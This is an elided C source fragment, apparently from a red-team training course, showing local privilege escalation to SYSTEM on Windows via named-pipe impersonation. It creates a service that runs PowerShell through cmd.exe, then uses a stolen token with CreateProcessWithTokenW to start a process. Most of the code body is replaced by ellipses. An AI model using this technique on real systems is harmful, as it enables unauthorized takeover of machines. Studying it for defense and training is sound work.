/*
 ...
 Escalating to SYSTEM - named pipes
...
int ServiceGo(void) {
	...
	scService = CreateServiceA(scManager, PIPESRV, PIPESRV, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, 
							...
							"C:\\Windows\\\System32\\cmd.exe /rpowershell.exe c:\\RTO\\LPE\\2SYSTEM\\Piper\\go.ps1", 
...
int main() {
	...
	if (bPipeConn) {
		...
		if (!CreateProcessWithTokenW(hNewToken, LOGON_NETCREDENTIALS_ONLY, NULL, L"notepad.exe", 
